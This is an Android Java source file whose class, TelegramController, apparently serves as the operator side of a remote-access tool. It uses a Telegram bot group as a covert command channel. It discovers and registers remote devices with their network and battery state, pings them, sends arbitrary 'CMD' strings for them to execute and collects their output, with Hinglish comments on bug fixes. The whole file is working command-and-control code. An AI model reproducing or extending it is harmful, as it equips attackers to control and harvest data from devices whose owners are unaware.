package com.rx.controller;

import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class TelegramController {
    private static final String TAG = "RX_Ctrl";

    private final Map<String, Device> devices      = new ConcurrentHashMap<>();
    private final ExecutorService     executor      = Executors.newFixedThreadPool(3);
    private       int                 lastUpdateId  = 0;
    private       boolean             running       = false;
    private       OnUpdateListener    listener;

    // ── Callbacks ────────────────────────────────────────────────────
    public interface OnUpdateListener {
        void onDeviceListChanged(List<Device> devices);
        void onOutput(String deviceId, String output);
        void onConnected();
        void onError(String msg);
    }

    public void setListener(OnUpdateListener l) { this.listener = l; }

    // ── Start/Stop ───────────────────────────────────────────────────
    public void start() {
        running = true;
        executor.execute(this::pollLoop);
        executor.execute(this::pingLoop);
        // Start hote hi sab devices se REG maango
        executor.execute(() -> {
            try { Thread.sleep(1500); } catch (InterruptedException e) { return; }
            sendRaw("DISCOVER");
        });
    }

    public void stop() {
        running = false;
        executor.shutdownNow();
    }

    // ── BUG FIX #4: REFRESH ka asli kaam ────────────────────────────
    // Pehle: REFRESH sirf text change karta tha
    // Fix: DISCOVER broadcast → sab devices re-register karte hain
    public void requestRefresh() {
        executor.execute(() -> {
            lastUpdateId = 0; // Purane messages bhi check karo
            sendRaw("DISCOVER");
        });
    }

    // ── Poll Loop ────────────────────────────────────────────────────
    // Main bot ka getUpdates — CMD bot ke messages group mein dikhte hain ✓
    private void pollLoop() {
        while (running) {
            try {
                String url = Config.API_BASE + "/getUpdates"
                    + "?offset=" + (lastUpdateId + 1)
                    + "&timeout=" + Config.POLL_TIMEOUT
                    + "&allowed_updates=message";

                String resp = httpGet(url);
                if (resp != null) processUpdates(resp);

            } catch (Exception e) {
                Log.e(TAG, "Poll error: " + e.getMessage());
                try { Thread.sleep(3000); } catch (InterruptedException ie) { break; }
            }
        }
    }

    private void processUpdates(String resp) {
        try {
            JSONObject json    = new JSONObject(resp);
            if (!json.optBoolean("ok")) return;
            JSONArray  results = json.getJSONArray("result");

            for (int i = 0; i < results.length(); i++) {
                JSONObject update = results.getJSONObject(i);
                lastUpdateId = update.getInt("update_id");

                if (!update.has("message")) continue;
                JSONObject msg    = update.getJSONObject("message");
                String     text   = msg.optString("text", "");
                String     chatId = String.valueOf(msg.getJSONObject("chat").getLong("id"));

                if (!chatId.equals(Config.CONTROL_CHAT_ID)) continue;

                // REG:DEVICE_ID:network:battery
                if (text.startsWith("REG:")) {
                    String[] p = text.split(":", 4);
                    if (p.length >= 4) {
                        Device d   = devices.getOrDefault(p[1], new Device(p[1]));
                        d.online   = true;
                        d.network  = p[2];
                        d.battery  = p[3].trim();
                        d.lastSeen = System.currentTimeMillis();
                        devices.put(p[1], d);
                        notifyList();
                        if (listener != null) listener.onConnected();
                    }
                }

                // PONG:DEVICE_ID:network:battery  ← BUG FIX #2: pehle controller PONG ignore karta tha
                else if (text.startsWith("PONG:")) {
                    String[] p = text.split(":", 4);
                    if (p.length >= 4) {
                        Device d   = devices.getOrDefault(p[1], new Device(p[1]));
                        d.online   = true;
                        d.network  = p[2];
                        d.battery  = p[3].trim();
                        d.lastSeen = System.currentTimeMillis();
                        devices.put(p[1], d);
                        notifyList();
                    }
                }

                // OUT:DEVICE_ID:output
                else if (text.startsWith("OUT:")) {
                    int    sep    = text.indexOf(":", 4);
                    if (sep > 0) {
                        String devId  = text.substring(4, sep);
                        String output = text.substring(sep + 1);
                        Device d = devices.get(devId);
                        if (d != null) {
                            d.pendingOutput = output;
                            d.lastSeen      = System.currentTimeMillis();
                        }
                        if (listener != null) listener.onOutput(devId, output);
                    }
                }

                // OFF:DEVICE_ID
                else if (text.startsWith("OFF:")) {
                    String devId = text.substring(4).trim();
                    Device d = devices.get(devId);
                    if (d != null) { d.online = false; notifyList(); }
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Process error: " + e.getMessage());
        }
    }

    // ── Ping Loop ────────────────────────────────────────────────────
    private void pingLoop() {
        int  cycle = 0;
        while (running) {
            try {
                Thread.sleep(Config.PING_INTERVAL);

                // Known devices ko PING karo
                for (Device d : devices.values()) {
                    if (d.online) sendRaw("PING:" + d.id);
                }

                // Har 6 cycle (1 dakika) mein DISCOVER bhi karo — naye devices dhundo
                if (++cycle % 6 == 0) sendRaw("DISCOVER");

                // Offline check
                boolean changed = false;
                for (Device d : devices.values()) {
                    boolean wasOnline = d.online;
                    d.online = d.isAlive();
                    if (wasOnline != d.online) changed = true;
                }
                if (changed) notifyList();

            } catch (InterruptedException e) {
                break;
            } catch (Exception e) {
                Log.e(TAG, "Ping error: " + e.getMessage());
            }
        }
    }

    // ── Send Command ──────────────────────────────────────────────────
    public void sendCommand(String deviceId, String command) {
        executor.execute(() -> sendRaw("CMD:" + deviceId + ":" + command));
    }

    // Main bot se bhejo → VPS CMD bot ke getUpdates mein dikhega (group mein) ✓
    private void sendRaw(String text) {
        try {
            String params = "chat_id=" + URLEncoder.encode(Config.CONTROL_CHAT_ID, "UTF-8")
                          + "&text="   + URLEncoder.encode(text, "UTF-8");
            httpPost(Config.API_BASE + "/sendMessage", params);
        } catch (Exception e) {
            Log.e(TAG, "Send: " + e.getMessage());
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────
    private void notifyList() {
        if (listener == null) return;
        List<Device> list = new ArrayList<>(devices.values());
        list.sort((a, b) -> {
            if (a.online != b.online) return a.online ? -1 : 1;
            return a.id.compareTo(b.id);
        });
        listener.onDeviceListChanged(list);
    }

    public List<Device> getDevices() {
        List<Device> list = new ArrayList<>(devices.values());
        list.sort((a, b) -> a.online != b.online ? (a.online ? -1 : 1) : a.id.compareTo(b.id));
        return list;
    }

    public Device waitOutput(String deviceId, int timeoutSec) {
        Device d = devices.get(deviceId);
        if (d == null) return null;
        d.pendingOutput = null;
        long deadline = System.currentTimeMillis() + timeoutSec * 1000L;
        while (System.currentTimeMillis() < deadline) {
            if (d.pendingOutput != null) return d;
            try { Thread.sleep(300); } catch (InterruptedException e) { break; }
        }
        return null;
    }

    // HTTP helpers
    private String httpGet(String urlStr) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(urlStr).openConnection();
            c.setConnectTimeout(10000);
            c.setReadTimeout((Config.POLL_TIMEOUT + 5) * 1000);
            if (c.getResponseCode() != 200) return null;
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close(); c.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private void httpPost(String urlStr, String params) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(urlStr).openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(8000);
            c.setReadTimeout(8000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            OutputStream os = c.getOutputStream();
            os.write(params.getBytes("UTF-8"));
            os.flush(); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception e) { Log.e(TAG, "POST: " + e.getMessage()); }
    }
}
